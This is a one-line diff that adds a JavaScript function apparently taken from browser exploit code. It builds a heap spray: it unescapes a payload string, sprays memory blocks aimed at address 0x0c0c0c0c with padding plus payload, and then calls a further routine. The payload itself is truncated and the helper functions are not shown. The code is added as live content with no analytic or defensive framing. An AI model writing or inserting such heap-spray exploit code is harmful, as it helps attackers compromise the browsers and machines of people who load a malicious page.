@@ -1,0 +1,1 @@
+function ms() { \n    var plc = unescape('\x43\x43\x43\x43...');  // Unescape a string to prepare some payload\n    if (mf) return 0;\n    mf = 1; \n    var hsta = 0x0c0c0c0c, hbs = 0x100000, pl = plc.length * 2, sss = hbs - (pl + 0x38);\n    var ss = gss(addr(hsta), sss), hb = (hsta - hbs) / hbs;\n    for (i = 0; i < hb; i++) m[i] = ss + plc; \n    hav();\n    return 1; \n}
